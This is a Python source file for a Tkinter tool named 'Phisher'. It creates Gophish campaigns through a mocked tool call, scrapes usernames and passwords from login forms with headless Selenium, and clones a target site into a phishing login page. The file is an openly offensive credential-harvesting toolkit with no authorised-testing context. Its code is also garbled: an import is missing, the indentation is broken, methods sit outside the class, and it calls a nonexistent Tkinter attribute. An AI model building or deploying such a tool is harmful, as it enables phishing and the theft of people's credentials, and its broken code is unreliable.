import os
import asyncio
import logging
import tkinter as tk
from tkinter import messagebox
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

def get_api_key_from_config():
    try:
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
            return config.get('gophish_api_key')
    except FileNotFoundError:
        logging.error("Configuration file not found.")
        return None
    except json.JSONDecodeError:
        logging.error("Error decoding JSON from configuration file.")
        return None
    except Exception as e:
        logging.error(f"An error occurred while reading the configuration file: {e}")
        return None

async def use_mcp_tool(params):
    # Mock implementation of the tool
    class Result:
        def __init__(self, text):
            self.content = [self]
            self.text = text
    
    # Simulate API call
    await asyncio.sleep(1)
    return Result(f"Campaign {params['arguments']['name']} created successfully")

class Phisher:
    def __init__(self, master):
        self.master = master
        self.name_entry = None
        self.target_url_entry = None 
        self.campaign_id_entry = None
        self.setup_ui()

def setup_ui(self):
    self.name_label = tk.Label(self.master, text="Campaign Name:")
    self.name_label.pack()
    self.name_entry = tk.Entry(self.master)
    self.name_entry.pack()

    self.target_url_label = tk.Label(self.master, text="Target URL:")
    self.target_url_label.pack()
    self.target_url_entry = tk.Entry(self.master)
    self.target_url_entry.pack()

    self.campaign_id_label = tk.Label(self.master, text="Campaign ID:")
    self.campaign_id_label.pack()
    self.campaign_id_entry = tk.Entry(self.master)
    self.campaign_id_entry.pack()

    self.create_button = tk.Button(self.master, text="Create Campaign", command=lambda: asyncio.run(self.create_campaign()))
    self.create_button.pack()

    self.extract_button = tk.Button(self.master, text="Extract Credentials", command=lambda: asyncio.run(self.extract_credentials()))
    self.extract_button.pack()

    self.monitor_button = tk.Button(self.master, text="Monitor Campaign", command=self.monitor_campaign)
    self.monitor_button.pack()

    # Add drag-and-drop functionality for URL input
    self.target_url_entry.drop_target_register(tk.DND_FILES)
    self.target_url_entry.dnd_bind('<<Drop>>', self.on_drop)

    # Add real-time campaign status updates
    self.status_label = tk.Label(self.master, text="Status: Not Running")
    self.status_label.pack()

    # Improve error messages
    self.error_label = tk.Label(self.master, text="", fg="red")
    self.error_label.pack()

    async def create_campaign(self):
        name = self.name_entry.get()
        target_url = self.target_url_entry.get()
        campaign_id = self.campaign_id_entry.get()
        api_key = get_api_key_from_config()

        if not api_key:
            messagebox.showerror("Error", "API Key is missing. Please check your configuration file.")
            return False

        try:
            result = await use_mcp_tool({
                "server_name": 'gophish',
                "tool_name": 'create_campaign',
                "arguments": {
                    "name": name,
                    "target_url": target_url, 
                    "campaign_id": campaign_id,
                    "api_key": api_key
                }
            })
            messagebox.showinfo("Success", f"Gophish campaign created: {result.content[0].text}")
            return True
        except Exception as error:
            messagebox.showerror("Error", f"Failed to create campaign: {str(error)}")
            return False

async def extract_credentials(self):
    target_url = self.target_url_entry.get()
    campaign_id = self.campaign_id_entry.get()
    api_key = get_api_key_from_config()

    if not api_key:
        self.error_label.config(text="API Key is required to proceed.")
        return False

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(target_url)
        wait = WebDriverWait(driver, 10)
try:
    forms = driver.find_elements(By.TAG_NAME, "form")
    for form in forms:
        username_field = form.find_element(By.XPATH, "//input[@type='text' or @type='email']") if form else None
        password_field = form.find_element(By.XPATH, "//input[@type='password']") if form else None
        submit_button = form.find_element(By.XPATH, "//button[contains(text(), 'Login') or contains(text(), 'Submit')]") if form else None

        if username_field and password_field:
            username = username_field.get_attribute("value")
            password = password_field.get_attribute("value")

            if username and password:
                result = await use_mcp_tool({
                    "server_name": 'gophish',
                    "tool_name": 'submit_credentials',
                    "arguments": {
                        "campaign_id": campaign_id,
                        "username": username,
                        "password": password,
                        "api_key": api_key
                    }
                })
                self.status_label.config(text=f"Status: Credentials Submitted")
                messagebox.showinfo("Success", f"Credentials submitted: {result.content[0].text}")
                return True
            else:
                self.error_label.config(text="Could not extract credentials.")
                return False
    self.error_label.config(text="Form elements not found.")
    return False
except (TimeoutException, NoSuchElementException) as e:
    logging.error(f"Error extracting credentials: {e}")
    self.error_label.config(text=f"Error extracting credentials. Please check the log file for details.")
    return False
finally:
    driver.quit()

async def generate_phishing_page(self):
    target_url = self.target_url_entry.get()
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(target_url)
        wait = WebDriverWait(driver, 10)
        try:
            # Clone the page content
            page_source = driver.page_source

            # Save the cloned page to a file
            with open('cloned_page.html', 'w') as file:
                file.write(page_source)

            # Inject dynamic content
            with open('cloned_page.html', 'r') as file:
                content = file.read()
                # Example: Replace a specific element with a phishing form
                content = content.replace('<div id="login-form">', '<div id="login-form"><form action="/submit" method="post"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button type="submit">Login</button></form>')
            
            with open('cloned_page.html', 'w') as file:
                file.write(content)

            self.status_label.config(text=f"Status: Phishing Page Generated")
            messagebox.showinfo("Success", "Phishing page generated successfully.")
            return True
        except (TimeoutException, NoSuchElementException) as e:
            logging.error(f"Error generating phishing page: {e}")
            self.error_label.config(text=f"Error generating phishing page. Please check the log file for details.")
            return False
    finally:
        driver.quit()

async def real_time_analytics(self):
    campaign_id = self.campaign_id_entry.get()
    api_key = get_api_key_from_config()

    if not api_key:
        self.error_label.config(text="API Key is required to proceed.")
        return False

    try:
        result = await use_mcp_tool({
            "server_name": 'gophish',
            "tool_name": 'get_campaign_analytics',
            "arguments": {
                "campaign_id": campaign_id,
                "api_key": api_key
            }
        })
        self.status_label.config(text=f"Status: Analytics Updated")
        messagebox.showinfo("Analytics", f"Current campaign analytics: {result.content[0].text}")
        return True
    except Exception as error:
        logging.error(f"Error retrieving analytics: {error}")
        self.error_label.config(text=f"Error retrieving analytics. Please check the log file for details.")
        return False

async def monitor_campaign(self):
    campaign_id = self.campaign_id_entry.get()
    api_key = get_api_key_from_config()

    if not api_key:
        self.error_label.config(text="API Key is required to proceed.")
        return False

    try:
        result = await use_mcp_tool({
            "server_name": 'gophish',
            "tool_name": 'monitor_campaign',
            "arguments": {
                "campaign_id": campaign_id,
                "api_key": api_key
            }
        })
        self.status_label.config(text=f"Status: Monitoring Campaign")
        messagebox.showinfo("Campaign Monitoring", f"Current campaign status: {result.content[0].text}")
        return True
    except Exception as error:
        logging.error(f"Error monitoring campaign: {error}")
        self.error_label.config(text=f"Error monitoring campaign. Please check the log file for details.")
        return False
